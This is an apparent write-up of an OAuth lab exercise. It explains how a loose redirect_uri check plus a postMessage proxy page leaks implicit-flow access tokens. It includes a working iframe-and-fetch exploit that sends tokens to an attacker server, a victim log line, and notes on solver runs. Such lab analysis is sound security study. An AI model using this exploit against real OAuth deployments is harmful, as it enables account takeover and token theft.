# Report: stealing OAuth access tokens via a proxy page

## Situation

The client blog application delegates login to an OAuth/OIDC provider
(`oauth-<id>.oauth-server.net`) using the implicit flow (`response_type=token`). The access token is
delivered in the URL fragment to `/oauth-callback`, which forwards it to the client's own
`/authenticate` endpoint. The OAuth provider's `/me` returns `sub`, `email`, `name` and the user's
`apikey`.

## Map of the moving parts (measured, not assumed)

| Endpoint | Behaviour |
|---|---|
| `GET /social-login` | `meta refresh` to the provider's `/auth` with `client_id`, `redirect_uri`, `response_type=token`, `nonce`, `scope=openid profile email` |
| `GET /auth?...` | Node `oidc-provider`; 302 to `/interaction/<id>` and sets an `_interaction` cookie. The interaction is bound to that cookie — a cookie-less request to the redirect target fails with `SessionNotFound` |
| `POST /interaction/<id>/login` | Form login (`wiener:peter`) → consent page |
| `POST /interaction/<id>/confirm` | 302 → `/auth/<id>` → 302 to `redirect_uri#access_token=...&expires_in=3600...` |
| `GET /oauth-callback` | Client-side script: reads the fragment, calls `/me`, posts to `/authenticate` |
| `GET /post/comment/comment-form` | **Proxy page**: `parent.postMessage({type:'onload', data: window.location.href}, '*')` |
| `GET oauth/me` with `Authorization: Bearer <token>` | `{"sub","apikey","name","email","email_verified"}` |
| `POST /submitSolution` `answer=<key>` | `{"correct":true}` on success |

## Validation weakness

`redirect_uri` is accepted when it merely *starts with* the registered callback, so a traversal
segment reaches any page on the client:

```
https://<lab>/oauth-callback/../post/comment/comment-form   -> accepted (sign-in page renders)
https://evil.example.net/oauth-callback/../x                -> rejected (HTTP 400)
```

Because `/post/comment/comment-form` is same-origin with the callback but has no framing protection,
framing the authorize endpoint turns it into a token exfiltration proxy: the browser follows
`/auth → /oauth-callback/../post/comment/comment-form#access_token=…`, and the page immediately
`postMessage`s its full URL, fragment included, to the attacker's iframe parent.

## Exploit as built

```html
<script>
window.addEventListener('message', function(e) {
  fetch('/?d=' + encodeURIComponent(JSON.stringify(e.data)), {mode:'no-cors'});
}, false);
</script>
<iframe src="…/auth?client_id=…&redirect_uri=…/oauth-callback/../post/comment/comment-form
             &response_type=token&nonce=<fresh>&scope=openid%20profile%20email"></iframe>
```

Verified access-log entry from the victim browser (16:22:29 UTC):

```
10.0.4.165  … "GET /?d=%7B%22type%22%3A%22onload%22%2C%22data%22%3A%22…%2Fpost%2Fcomment%2Fcomment-form
%23access_token%3D%3CREDACTED%3E%26expires_in%3D3600…" 200 "user-agent: Mozilla/5.0 (Victim) … Chrome/154"
```

`/me` for that token returned `sub=administrator, apikey=<REDACTED>`, and `POST /submitSolution` answered
`{"correct":true}`; the lab widget then reported `is-solved`.

## Solver behaviour and measurements

| Run | Result | Requests | Wall clock |
|---|---|---|---|
| Manual chain (discovery → store → deliver → token → `/me` → submit) | solved | ~14 | ~110 s of exploration |
| `solve.py` on a **fresh, unsolved** instance | exit 0, verified | 12 | **6.05 s** |
| `solve.py` on an already-solved instance | exit 0 (short-circuit) | 3 | 0.9 s |
| `solve.py --force` after the lab was solved (bot no longer visits) | exit 1, "no fresh token" | 57 | 96 s |

The last row is the important operational note: **the Academy victim browser stops loading delivered
exploits once the lab is marked solved.** Deliveries still return `302`, but no victim request reaches
the exploit server, so no token is produced. A `--force` re-run on a solved instance is therefore only
meaningful for the discovery/parsing path, not for a fresh leak.

## Independent verification of the harvest path

Because the admin bot had already retired, the production harvest function was exercised against a
real leak instead: a browser session logged in at the provider loaded a freshly stored payload
(new nonce), the proxy page posted the URL, and the solver's own
`extract_leaked_token(log, baseline)` picked the new entry out of the log — `/me` resolved it to
`sub=wiener`, confirming a genuine, fresh token rather than a stale cached one.

## Dead ends / pitfalls hit

- Cookie-less requests to `/auth` (following the interaction redirect) fail with
  `SessionNotFound: invalid_request`; the provider binds the interaction to the `_interaction` cookie.
- Reusing a `nonce` produces a flow the provider refuses; every payload must carry a new one.
- An unsolved-lab run that reads the whole access log can pick up an *old* token (the validator that
  accepts it hides the mistake). Baseline-tracking of log lines is required for honest harvesting.
- Chrome caching the stored exploit page keeps the old `nonce` and silently breaks the chain; a
  distinct URL or a re-`STORE` is needed.
- **The delivery POST is not the delivery.** `POST /` with `formAction=DELIVER_TO_VICTIM` answers
  `302 /deliver-to-victim`; the bot is only queued when that redirect is followed. A non-redirecting
  client sees "Delivered" and an access log with zero victim hits — which is exactly how the first
  fresh-instance run failed.
